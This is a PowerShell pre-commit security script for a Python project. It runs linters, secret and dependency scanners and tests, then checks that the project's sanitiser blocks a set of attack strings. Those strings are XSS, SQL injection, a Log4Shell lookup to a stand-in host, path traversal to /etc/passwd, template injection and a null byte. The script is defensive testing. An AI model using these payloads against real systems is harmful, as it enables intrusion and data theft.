# Vajra Daily Security Ritual
# Run this every day before committing
# Every finding gets a verdict — no exceptions

Write-Host "`n============================================" -ForegroundColor Cyan
Write-Host "   VAJRA DAILY SECURITY RITUAL" -ForegroundColor Cyan
Write-Host "   $(Get-Date -Format 'yyyy-MM-dd HH:mm')" -ForegroundColor Cyan
Write-Host "============================================`n" -ForegroundColor Cyan

$failures = 0
$results = @()

# -----------------------------------------------
# TOOL 1: RUFF — code quality + security linting
# WHY: Catches bad imports, unused vars, style issues
# that can hide security bugs
# -----------------------------------------------
Write-Host "[1/6] RUFF - Code Quality" -ForegroundColor Yellow
$ruff = uv run ruff check vajra/ 2>&1
if ($LASTEXITCODE -eq 0) {
    Write-Host "      PASS - No issues found" -ForegroundColor Green
    $results += "RUFF:         PASS"
} else {
    Write-Host "      FAIL - Fix before committing" -ForegroundColor Red
    $ruff | ForEach-Object { Write-Host "      $_" }
    $failures++
    $results += "RUFF:         FAIL"
}

# -----------------------------------------------
# TOOL 2: BANDIT — Python security scanner
# WHY: Finds hardcoded passwords, weak crypto,
# shell injection, SQL injection in your Python code
# -----------------------------------------------
Write-Host "`n[2/6] BANDIT - Security Scan" -ForegroundColor Yellow
uv run bandit -r vajra/ -f screen -ll -q > bandit_report.txt 2>&1
$banditSummary = Get-Content bandit_report.txt | Select-String "High:|Medium:" | Select-Object -Last 2
$highIssues = (Get-Content bandit_report.txt | Select-String "High: (\d+)" | ForEach-Object { $_.Matches.Groups[1].Value }) -as [int]
$medIssues = (Get-Content bandit_report.txt | Select-String "Medium: (\d+)" | ForEach-Object { $_.Matches.Groups[1].Value }) -as [int]
Write-Host "      Full report: bandit_report.txt"
if ($highIssues -gt 0 -or $medIssues -gt 0) {
    Write-Host "      FAIL - High: $highIssues, Medium: $medIssues - review bandit_report.txt" -ForegroundColor Red
    $failures++
    $results += "BANDIT:       FAIL (High:$highIssues Med:$medIssues)"
} else {
    Write-Host "      PASS - No High or Medium issues" -ForegroundColor Green
    $results += "BANDIT:       PASS"
}

# -----------------------------------------------
# TOOL 3: DETECT-SECRETS — secret scanner
# WHY: Catches API keys, tokens, passwords
# accidentally committed to code
# -----------------------------------------------
Write-Host "`n[3/6] DETECT-SECRETS - Secret Scan" -ForegroundColor Yellow
$secrets = uv run detect-secrets scan vajra/ 2>&1 | ConvertFrom-Json
$secretCount = ($secrets.results.PSObject.Properties | Measure-Object).Count
if ($secretCount -gt 0) {
    Write-Host "      FAIL - $secretCount potential secret(s) found" -ForegroundColor Red
    $secrets.results.PSObject.Properties | ForEach-Object {
        Write-Host "      FILE: $($_.Name)" -ForegroundColor Red
    }
    $failures++
    $results += "DETECT-SECRETS: FAIL ($secretCount found)"
} else {
    Write-Host "      PASS - No secrets found" -ForegroundColor Green
    $results += "DETECT-SECRETS: PASS"
}

# -----------------------------------------------
# TOOL 4: PIP-AUDIT — supply chain scanner
# WHY: Finds CVEs in your dependencies
# SolarWinds happened because of a compromised dependency
# -----------------------------------------------
Write-Host "`n[4/6] PIP-AUDIT - Supply Chain Scan" -ForegroundColor Yellow
$audit = uv run pip-audit --ignore-vuln CVE-2026-4539 --skip-editable 2>&1
if ($LASTEXITCODE -eq 0) {
    Write-Host "      PASS - No known vulnerabilities" -ForegroundColor Green
    $results += "PIP-AUDIT:    PASS"
} else {
    Write-Host "      FAIL - Vulnerable dependencies found" -ForegroundColor Red
    $audit | Select-String "CVE-" | ForEach-Object { Write-Host "      $_" -ForegroundColor Red }
    $failures++
    $results += "PIP-AUDIT:    FAIL"
}

# -----------------------------------------------
# TOOL 5: PYTEST — security contract tests
# WHY: Proves your security properties hold
# These tests are your proof that defenses work
# -----------------------------------------------
Write-Host "`n[5/6] PYTEST - Security Contracts" -ForegroundColor Yellow
$pytest = uv run pytest tests/ -q --tb=short 2>&1
$lastLines = $pytest | Select-Object -Last 3
$lastLines | ForEach-Object { Write-Host "      $_" }
if ($LASTEXITCODE -eq 0) {
    Write-Host "      PASS - All security contracts hold" -ForegroundColor Green
    $results += "PYTEST:       PASS"
} else {
    Write-Host "      FAIL - Security contract broken" -ForegroundColor Red
    $failures++
    $results += "PYTEST:       FAIL"
}

# -----------------------------------------------
# TOOL 6: APPSEC ATTACKS — attack your own code
# WHY: Running tools is not enough
# You must actively try to break what you built
# -----------------------------------------------
Write-Host "`n[6/6] APPSEC - Attack Your Own Code" -ForegroundColor Yellow

$attacks = @(
    @{name="XSS"; payload="<script>alert(1)</script>"},
    @{name="SQLi"; payload="' OR 1=1 --"},
    @{name="Log4Shell"; payload='${jndi:ldap://evil.com}'},
    @{name="Path Traversal"; payload="../../etc/passwd"},
    @{name="Template Injection"; payload="{{7*7}}"},
    @{name="Null Byte"; payload="`0hidden"}
)

$bypassed = 0
foreach ($attack in $attacks) {
    $result = uv run python -c @"
from vajra.core.validation import InputSanitiser
s = InputSanitiser()
try:
    s.sanitise(r'$($attack.payload)')
    print('BYPASSED')
except Exception:
    print('BLOCKED')
"@ 2>&1
    if ($result -match "BYPASSED") {
        Write-Host "      BYPASSED: $($attack.name)" -ForegroundColor Red
        $bypassed++
    } else {
        Write-Host "      BLOCKED:  $($attack.name)" -ForegroundColor Green
    }
}

# Credential leak check
$leak = uv run python -c @"
from vajra.core.crypto import SecureCredential
c = SecureCredential.from_plaintext(b'AWS-SECRET-KEY-12345')
out = str(c) + repr(c) + f'{c}'
print('LEAKED' if 'AWS-SECRET-KEY' in out else 'SAFE')
"@ 2>&1
if ($leak -match "LEAKED") {
    Write-Host "      BYPASSED: Credential Leak" -ForegroundColor Red
    $bypassed++
} else {
    Write-Host "      BLOCKED:  Credential Leak" -ForegroundColor Green
}

if ($bypassed -eq 0) {
    Write-Host "      PASS - All $($attacks.Count + 1) attacks blocked" -ForegroundColor Green
    $results += "APPSEC:       PASS"
} else {
    Write-Host "      FAIL - $bypassed attack(s) bypassed" -ForegroundColor Red
    $failures++
    $results += "APPSEC:       FAIL ($bypassed bypassed)"
}

# -----------------------------------------------
# FINAL REPORT
# -----------------------------------------------
Write-Host "`n============================================" -ForegroundColor Cyan
Write-Host "   DAILY SECURITY REPORT" -ForegroundColor Cyan
Write-Host "============================================" -ForegroundColor Cyan
$results | ForEach-Object {
    if ($_ -match "FAIL") {
        Write-Host "   $_" -ForegroundColor Red
    } else {
        Write-Host "   $_" -ForegroundColor Green
    }
}
Write-Host "--------------------------------------------"
if ($failures -eq 0) {
    Write-Host "   ALL CLEAN - Safe to commit" -ForegroundColor Green
} else {
    Write-Host "   $failures tool(s) failed - DO NOT commit" -ForegroundColor Red
}
Write-Host "============================================`n" -ForegroundColor Cyan
